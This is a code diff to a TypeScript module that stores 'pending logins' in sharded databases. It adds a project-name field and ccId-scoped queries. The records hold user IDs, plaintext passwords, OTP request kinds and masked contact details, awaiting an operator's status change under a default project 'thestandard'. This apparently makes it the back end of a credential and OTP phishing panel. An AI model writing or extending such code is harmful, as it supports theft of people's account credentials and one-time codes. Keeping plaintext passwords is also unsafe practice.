@@ -12,6 +12,8 @@ import {
   hasBackupDatabaseUrl,
   idForCreateTarget,
   isBackupPendingId,
+  createTargetRequiresCcId,
+  shardRequiresCcId,
   type CreateTarget,
 } from '@/lib/database-urls'
 import { getSqlForBackup, getSqlForShard } from '@/lib/db'
@@ -23,6 +25,7 @@ export type PendingRequestKind = 'login' | 'otp'
 export interface PendingLogin {
   id: string
   projectId: string
+  projectName?: string
   requestKind: PendingRequestKind
   userId: string
   password: string
@@ -52,7 +55,7 @@ async function ensureTableOnTarget(target: CreateTarget): Promise<boolean> {
   if (target.kind === 'primary' && tableEnsuredPrimary.has(target.index)) return true
   if (target.kind === 'backup' && tableEnsuredBackup) return true
 
-  if (target.kind === 'backup' && !hasCcId()) {
+  if (createTargetRequiresCcId(target) && !hasCcId()) {
     return false
   }
 
@@ -91,6 +94,11 @@ async function ensureTableOnTarget(target: CreateTarget): Promise<boolean> {
     } catch {
       // Column already exists
     }
+    try {
+      await sql`ALTER TABLE pending_logins ADD COLUMN IF NOT EXISTS project_name TEXT`
+    } catch {
+      // Column already exists
+    }
 
     if (target.kind === 'primary') tableEnsuredPrimary.add(target.index)
     else tableEnsuredBackup = true
@@ -110,6 +118,12 @@ function mapRow(row: Record<string, unknown>): PendingLogin {
   return {
     id: String(row.id),
     projectId: String((row as { projectId?: string }).projectId ?? DEFAULT_PROJECT),
+    projectName: (() => {
+      const raw = (row as { projectName?: unknown }).projectName
+      if (raw == null) return undefined
+      const s = String(raw).trim()
+      return s.length > 0 ? s : undefined
+    })(),
     requestKind: normalizeRequestKind((row as { requestKind?: unknown }).requestKind),
     userId: String(row.userId),
     password: String(row.password),
@@ -134,6 +148,7 @@ export async function createPendingLogin(data: {
   memberOrigin?: string
 }): Promise<PendingLogin> {
   const projectId = data.projectId ?? DEFAULT_PROJECT
+  const projectName = data.projectName?.trim() || undefined
   const requestKind = data.requestKind ?? 'login'
   const createdAt = Date.now()
   const ccId = getCcId() || undefined
@@ -143,7 +158,7 @@ export async function createPendingLogin(data: {
     let lastError: unknown
 
     for (const target of targets) {
-      if (target.kind === 'backup' && !hasCcId()) continue
+      if (createTargetRequiresCcId(target) && !hasCcId()) continue
 
       const ready = await ensureTableOnTarget(target)
       if (!ready) continue
@@ -152,6 +167,7 @@ export async function createPendingLogin(data: {
       const record: PendingLogin = {
         id,
         projectId,
+        projectName,
         requestKind,
         userId: data.userId,
         password: data.password,
@@ -168,11 +184,11 @@ export async function createPendingLogin(data: {
         const sql = await sqlForTarget(target)
         await sql`
           INSERT INTO pending_logins (
-            id, project_id, request_kind, user_id, password, method,
+            id, project_id, project_name, request_kind, user_id, password, method,
             masked_email, masked_phone, status, created_at, member_origin, cc_id
           )
           VALUES (
-            ${id}, ${projectId}, ${requestKind}, ${data.userId}, ${data.password}, ${data.method},
+            ${id}, ${projectId}, ${projectName ?? null}, ${requestKind}, ${data.userId}, ${data.password}, ${data.method},
             ${data.maskedEmail}, ${data.maskedPhone}, 'pending', ${createdAt},
             ${data.memberOrigin ?? null}, ${ccId ?? null}
           )
@@ -195,6 +211,7 @@ export async function createPendingLogin(data: {
   const record: PendingLogin = {
     id,
     projectId,
+    projectName,
     requestKind,
     userId: data.userId,
     password: data.password,
@@ -219,7 +236,7 @@ export async function getPendingLogin(id: string): Promise<PendingLogin | undefi
         const sql = await getSqlForBackup()
         const ccId = getCcId()
         const rows = await sql`
-          SELECT id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(request_kind, 'login') AS "requestKind",
+          SELECT id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(project_name, '') AS "projectName", COALESCE(request_kind, 'login') AS "requestKind",
             user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone",
             status, created_at AS "createdAt", member_origin AS "memberOrigin", cc_id AS "ccId"
           FROM pending_logins WHERE id = ${id} AND cc_id = ${ccId}
@@ -229,9 +246,17 @@ export async function getPendingLogin(id: string): Promise<PendingLogin | undefi
       }
 
       for (const shardIndex of getShardIndicesForPendingId(id)) {
+        if (shardRequiresCcId(shardIndex) && !hasCcId()) continue
         const sql = await getSqlForShard(shardIndex)
-        const rows = await sql`
-          SELECT id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(request_kind, 'login') AS "requestKind",
+        const rows = shardRequiresCcId(shardIndex)
+          ? await sql`
+          SELECT id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(project_name, '') AS "projectName", COALESCE(request_kind, 'login') AS "requestKind",
+            user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone",
+            status, created_at AS "createdAt", member_origin AS "memberOrigin", cc_id AS "ccId"
+          FROM pending_logins WHERE id = ${id} AND cc_id = ${getCcId()}
+        `
+          : await sql`
+          SELECT id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(project_name, '') AS "projectName", COALESCE(request_kind, 'login') AS "requestKind",
             user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone",
             status, created_at AS "createdAt", member_origin AS "memberOrigin", cc_id AS "ccId"
           FROM pending_logins WHERE id = ${id}
@@ -267,7 +292,7 @@ export async function setPendingLoginStatus(
         const rows = await sql`
           UPDATE pending_logins SET status = ${status}
           WHERE id = ${id} AND status = 'pending' AND cc_id = ${ccId}
-          RETURNING id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(request_kind, 'login') AS "requestKind",
+          RETURNING id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(project_name, '') AS "projectName", COALESCE(request_kind, 'login') AS "requestKind",
             user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone",
             status, created_at AS "createdAt", member_origin AS "memberOrigin", cc_id AS "ccId"
         `
@@ -276,11 +301,13 @@ export async function setPendingLoginStatus(
       }
 
       for (const shardIndex of getShardIndicesForPendingId(id)) {
+        if (shardRequiresCcId(shardIndex) && !hasCcId()) continue
         const sql = await getSqlForShard(shardIndex)
-        const rows = await sql`
+        const rows = shardRequiresCcId(shardIndex)
+          ? await sql`
           UPDATE pending_logins SET status = ${status}
-          WHERE id = ${id} AND status = 'pending'
-          RETURNING id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(request_kind, 'login') AS "requestKind",
+          WHERE id = ${id} AND status = 'pending' AND cc_id = ${getCcId()}
+          RETURNING id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(project_name, '') AS "projectName", COALESCE(request_kind, 'login') AS "requestKind",
             user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone",
             status, created_at AS "createdAt", member_origin AS "memberOrigin", cc_id AS "ccId"
         `
@@ -317,7 +344,7 @@ export async function listPendingLogins(): Promise<PendingLogin[]> {
           WHERE status = 'pending' AND created_at < ${expireThreshold}
         `
         const rows = await sql`
-          SELECT id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(request_kind, 'login') AS "requestKind",
+          SELECT id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(project_name, '') AS "projectName", COALESCE(request_kind, 'login') AS "requestKind",
             user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone",
             status, created_at AS "createdAt", member_origin AS "memberOrigin", cc_id AS "ccId"
           FROM pending_logins WHERE status = 'pending' ORDER BY created_at ASC
@@ -334,7 +361,7 @@ export async function listPendingLogins(): Promise<PendingLogin[]> {
           WHERE status = 'pending' AND created_at < ${expireThreshold} AND cc_id = ${ccId}
         `
         const rows = await sql`
-          SELECT id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(request_kind, 'login') AS "requestKind",
+          SELECT id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(project_name, '') AS "projectName", COALESCE(request_kind, 'login') AS "requestKind",
             user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone",
             status, created_at AS "createdAt", member_origin AS "memberOrigin", cc_id AS "ccId"
           FROM pending_logins WHERE status = 'pending' AND cc_id = ${ccId} ORDER BY created_at ASC
@@ -374,7 +401,7 @@ export async function listAllLogins(limit: number = 100): Promise<PendingLogin[]
           WHERE status = 'pending' AND created_at < ${expireThreshold}
         `
         const rows = await sql`
-          SELECT id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(request_kind, 'login') AS "requestKind",
+          SELECT id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(project_name, '') AS "projectName", COALESCE(request_kind, 'login') AS "requestKind",
             user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone",
             status, created_at AS "createdAt", member_origin AS "memberOrigin", cc_id AS "ccId"
           FROM pending_logins ORDER BY created_at DESC LIMIT ${limit}
@@ -391,7 +418,7 @@ export async function listAllLogins(limit: number = 100): Promise<PendingLogin[]
           WHERE status = 'pending' AND created_at < ${expireThreshold} AND cc_id = ${ccId}
         `
         const rows = await sql`
-          SELECT id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(request_kind, 'login') AS "requestKind",
+          SELECT id, COALESCE(project_id, 'thestandard') AS "projectId", COALESCE(project_name, '') AS "projectName", COALESCE(request_kind, 'login') AS "requestKind",
             user_id AS "userId", password, method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone",
             status, created_at AS "createdAt", member_origin AS "memberOrigin", cc_id AS "ccId"
           FROM pending_logins WHERE cc_id = ${ccId} ORDER BY created_at DESC LIMIT ${limit}
